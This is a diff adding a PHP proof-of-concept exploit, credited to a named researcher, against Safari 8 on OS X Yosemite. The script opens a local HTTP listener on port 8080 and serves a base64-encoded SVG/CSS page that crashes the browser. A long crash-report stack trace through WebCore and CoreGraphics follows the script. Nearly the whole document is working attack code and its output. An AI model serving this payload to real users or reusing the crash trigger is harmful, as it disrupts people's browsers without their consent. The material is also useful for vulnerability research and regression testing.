@@ -1,0 +1,204 @@
+#!/usr/bin/php
+<?php
+# Title          :  Safari 8.0.X / OS X Yosemite 10.10.3 Crash Proof Of 
+Concept
+# Product Website:  https://www.apple.com/safari/
+# Author         :  Mohammad Reza Espargham
+# Linkedin       :  https://ir.linkedin.com/in/rezasp
+# E-Mail         :  me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
+# Website        :  www.reza.es
+# Twitter        :  https://twitter.com/rezesp
+# FaceBook       :  https://www.facebook.com/mohammadreza.espargham
+
+
+
+# Usage :
+# php poc.php
+# Open Safari and open ip:8080 / 127.0.0.1:8080
+# Crashed ;)
+
+#Main POC Code
+$reza = socket_create(AF_INET, SOCK_STREAM, 0) or die('Failed to create 
+socket!');
+socket_bind($reza, 0,8080);
+socket_listen($reza);
+print "\nNow Open Safari and open ip:8080 / 127.0.0.1:8080\n\n";
+$msg = 
+'PGh0bWw+CjxzdHlsZT4Kc3ZnIHsKICAgIHBhZGRpbmctdG9wOiAxMzk0JTsKICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7Cn0KPC9zdHlsZT4KPHN2ZyB2aWV3Qm94PSIxIDIgNTAwIDUwMCIgd2lkdGg9IjkwMCIgaGVpZ2h0PSI5MDAiPgo8cG9seWxpbmUgcG9pbnRzPSIxIDEsMiAyIj48L3BvbHlsaW5lPgo8L3N2Zz4KPC9odG1sPg==';
+$msgd=base64_decode($msg);
+for (;;) {
+         if ($client = @socket_accept($reza)) {
+             socket_write($client, "HTTP/1.1 200 OK\r\n" .
+             "Content-length: " . strlen($msgd) . "\r\n" .
+             "Content-Type: text/html; charset=UTF-8\r\n\r\n" .
+             $msgd);
+         }
+         else usleep(100000);
+}
+
+
+
+
+
+#Crash Report
+/*
+
+Process Model:
+Multiple Web Processes
+
+
+Thread 0 Crashed:: Dispatch queue: com.apple.main-thread
+0   libsystem_kernel.dylib        	0x00007fff8e628286 __pthread_kill + 
+10
+1   libsystem_c.dylib             	0x00007fff90619b53 abort + 129
+2   libsystem_c.dylib             	0x00007fff905e1c39 __assert_rtn + 321
+3   com.apple.CoreGraphics        	0x00007fff87716e4e 
+CGPathCreateMutableCopyByTransformingPath + 242
+4   com.apple.CoreGraphics        	0x00007fff8773aff0 CGContextAddPath + 
+93
+5   com.apple.WebCore             	0x0000000104ea8c84 
+WebCore::GraphicsContext::fillPath(WebCore::Path const&) + 148
+6   com.apple.WebCore             	0x000000010597e851 
+WebCore::RenderSVGResourceSolidColor::postApplyResource(WebCore::RenderElement&, 
+WebCore::GraphicsContext*&, unsigned short, WebCore::Path const*, 
+WebCore::RenderSVGShape const*) + 65
+7   com.apple.WebCore             	0x000000010597f08a 
+WebCore::RenderSVGShape::fillShape(WebCore::RenderStyle const&, 
+WebCore::GraphicsContext*) + 122
+8   com.apple.WebCore             	0x000000010597f3c3 
+WebCore::RenderSVGShape::fillStrokeMarkers(WebCore::PaintInfo&) + 131
+9   com.apple.WebCore             	0x0000000104fa73cb 
+WebCore::RenderSVGShape::paint(WebCore::PaintInfo&, WebCore::LayoutPoint 
+const&) + 379
+10  com.apple.WebCore             	0x0000000104fa7062 
+WebCore::RenderSVGRoot::paintReplaced(WebCore::PaintInfo&, 
+WebCore::LayoutPoint const&) + 1330
+11  com.apple.WebCore             	0x0000000104f1ee72 
+WebCore::RenderReplaced::paint(WebCore::PaintInfo&, WebCore::LayoutPoint 
+const&) + 722
+12  com.apple.WebCore             	0x0000000105429e88 
+WebCore::InlineElementBox::paint(WebCore::PaintInfo&, 
+WebCore::LayoutPoint const&, WebCore::LayoutUnit, WebCore::LayoutUnit) + 
+312
+13  com.apple.WebCore             	0x0000000104ea4a63 
+WebCore::InlineFlowBox::paint(WebCore::PaintInfo&, WebCore::LayoutPoint 
+const&, WebCore::LayoutUnit, WebCore::LayoutUnit) + 1251
+14  com.apple.WebCore             	0x0000000104ea4509 
+WebCore::RootInlineBox::paint(WebCore::PaintInfo&, WebCore::LayoutPoint 
+const&, WebCore::LayoutUnit, WebCore::LayoutUnit) + 89
+15  com.apple.WebCore             	0x0000000104e53d96 
+WebCore::RenderLineBoxList::paint(WebCore::RenderBoxModelObject*, 
+WebCore::PaintInfo&, WebCore::LayoutPoint const&) const + 694
+16  com.apple.WebCore             	0x0000000104e51373 
+WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, 
+WebCore::LayoutPoint const&) + 67
+17  com.apple.WebCore             	0x0000000104e50724 
+WebCore::RenderBlock::paintObject(WebCore::PaintInfo&, 
+WebCore::LayoutPoint const&) + 420
+18  com.apple.WebCore             	0x0000000104e529af 
+WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::LayoutPoint 
+const&) + 287
+19  com.apple.WebCore             	0x00000001058db139 
+WebCore::RenderBlock::paintChild(WebCore::RenderBox&, 
+WebCore::PaintInfo&, WebCore::LayoutPoint const&, WebCore::PaintInfo&, 
+bool) + 393
+20  com.apple.WebCore             	0x0000000104e51478 
+WebCore::RenderBlock::paintChildren(WebCore::PaintInfo&, 
+WebCore::LayoutPoint const&, WebCore::PaintInfo&, bool) + 72
+21  com.apple.WebCore             	0x0000000104e51420 
+WebCore::RenderBlock::paintContents(WebCore::PaintInfo&, 
+WebCore::LayoutPoint const&) + 240
+22  com.apple.WebCore             	0x0000000104e50724 
+WebCore::RenderBlock::paintObject(WebCore::PaintInfo&, 
+WebCore::LayoutPoint const&) + 420
+23  com.apple.WebCore             	0x0000000104e529af 
+WebCore::RenderBlock::paint(WebCore::PaintInfo&, WebCore::LayoutPoint 
+const&) + 287
+24  com.apple.WebCore             	0x0000000104e512b2 
+WebCore::RenderLayer::paintForegroundForFragmentsWithPhase(WebCore::PaintPhase, 
+WTF::Vector<WebCore::LayerFragment, 1ul, WTF::CrashOnOverflow> const&, 
+WebCore::GraphicsContext*, WebCore::RenderLayer::LayerPaintingInfo 
+const&, unsigned int, WebCore::RenderObject*) + 370
+25  com.apple.WebCore             	0x0000000104e50f87 
+WebCore::RenderLayer::paintForegroundForFragments(WTF::Vector<WebCore::LayerFragment, 
+1ul, WTF::CrashOnOverflow> const&, WebCore::GraphicsContext*, 
+WebCore::GraphicsContext*, WebCore::LayoutRect const&, bool, 
+WebCore::RenderLayer::LayerPaintingInfo const&, unsigned int, 
+WebCore::RenderObject*, bool, bool) + 423
+26  com.apple.WebCore             	0x0000000104e4fc30 
+WebCore::RenderLayer::paintLayerContents(WebCore::GraphicsContext*, 
+WebCore::RenderLayer::LayerPaintingInfo const&, unsigned int) + 2576
+27  com.apple.WebCore             	0x0000000104e4f002 
+WebCore::RenderLayer::paintLayer(WebCore::GraphicsContext*, 
+WebCore::RenderLayer::LayerPaintingInfo const&, unsigned int) + 1010
+28  com.apple.WebCore             	0x0000000104e4fd62 
+WebCore::RenderLayer::paintLayerContents(WebCore::GraphicsContext*, 
+WebCore::RenderLayer::LayerPaintingInfo const&, unsigned int) + 2882
+29  com.apple.WebCore             	0x0000000104e7ac36 
+WebCore::RenderLayerBacking::paintIntoLayer(WebCore::GraphicsLayer 
+const*, WebCore::GraphicsContext*, WebCore::IntRect const&, unsigned 
+int, unsigned int) + 358
+30  com.apple.WebCore             	0x000000010593757f 
+WebCore::RenderLayerBacking::paintContents(WebCore::GraphicsLayer 
+const*, WebCore::GraphicsContext&, unsigned int, WebCore::FloatRect 
+const&) + 799
+31  com.apple.WebCore             	0x000000010537dd44 
+WebCore::GraphicsLayer::paintGraphicsLayerContents(WebCore::GraphicsContext&, 
+WebCore::FloatRect const&) + 132
+32  com.apple.WebCore             	0x00000001058b6ad9 
+WebCore::PlatformCALayer::drawLayerContents(CGContext*, 
+WebCore::PlatformCALayer*, WTF::Vector<WebCore::FloatRect, 5ul, 
+WTF::CrashOnOverflow>&) + 361
+33  com.apple.WebCore             	0x0000000105b170a7 
+WebCore::TileGrid::platformCALayerPaintContents(WebCore::PlatformCALayer*, 
+WebCore::GraphicsContext&, WebCore::FloatRect const&) + 167
+34  com.apple.WebCore             	0x0000000105ba36cc -[WebSimpleLayer 
+drawInContext:] + 172
+35  com.apple.QuartzCore          	0x00007fff8d7033c7 
+CABackingStoreUpdate_ + 3306
+36  com.apple.QuartzCore          	0x00007fff8d7026d7 
+___ZN2CA5Layer8display_Ev_block_invoke + 59
+37  com.apple.QuartzCore          	0x00007fff8d702694 
+x_blame_allocations + 81
+38  com.apple.QuartzCore          	0x00007fff8d6f643c 
+CA::Layer::display_() + 1546
+39  com.apple.WebCore             	0x0000000105ba35eb -[WebSimpleLayer 
+display] + 43
+40  com.apple.QuartzCore          	0x00007fff8d6f47fd 
+CA::Layer::display_if_needed(CA::Transaction*) + 603
+41  com.apple.QuartzCore          	0x00007fff8d6f3e81 
+CA::Layer::layout_and_display_if_needed(CA::Transaction*) + 35
+42  com.apple.QuartzCore          	0x00007fff8d6f3612 
+CA::Context::commit_transaction(CA::Transaction*) + 242
+43  com.apple.QuartzCore          	0x00007fff8d6f33ae 
+CA::Transaction::commit() + 390
+44  com.apple.QuartzCore          	0x00007fff8d701f19 
+CA::Transaction::observer_callback(__CFRunLoopObserver*, unsigned long, 
+void*) + 71
+45  com.apple.CoreFoundation      	0x00007fff869f7127 
+__CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ + 23
+46  com.apple.CoreFoundation      	0x00007fff869f7080 
+__CFRunLoopDoObservers + 368
+47  com.apple.CoreFoundation      	0x00007fff869e8bf8 
+CFRunLoopRunSpecific + 328
+48  com.apple.HIToolbox           	0x00007fff8df1156f 
+RunCurrentEventLoopInMode + 235
+49  com.apple.HIToolbox           	0x00007fff8df112ea 
+ReceiveNextEventCommon + 431
+50  com.apple.HIToolbox           	0x00007fff8df1112b 
+_BlockUntilNextEventMatchingListInModeWithFilter + 71
+51  com.apple.AppKit              	0x00007fff8ebe59bb _DPSNextEvent + 
+978
+52  com.apple.AppKit              	0x00007fff8ebe4f68 -[NSApplication 
+nextEventMatchingMask:untilDate:inMode:dequeue:] + 346
+53  com.apple.AppKit              	0x00007fff8ebdabf3 -[NSApplication 
+run] + 594
+54  com.apple.AppKit              	0x00007fff8eb57354 NSApplicationMain 
++ 1832
+55  libxpc.dylib                  	0x00007fff8ab77958 _xpc_objc_main + 
+793
+56  libxpc.dylib                  	0x00007fff8ab79060 xpc_main + 490
+57  com.apple.WebKit.WebContent   	0x0000000103f10b40 0x103f10000 + 2880
+58  libdyld.dylib                 	0x00007fff873e45c9 start + 1
+*/
+?>
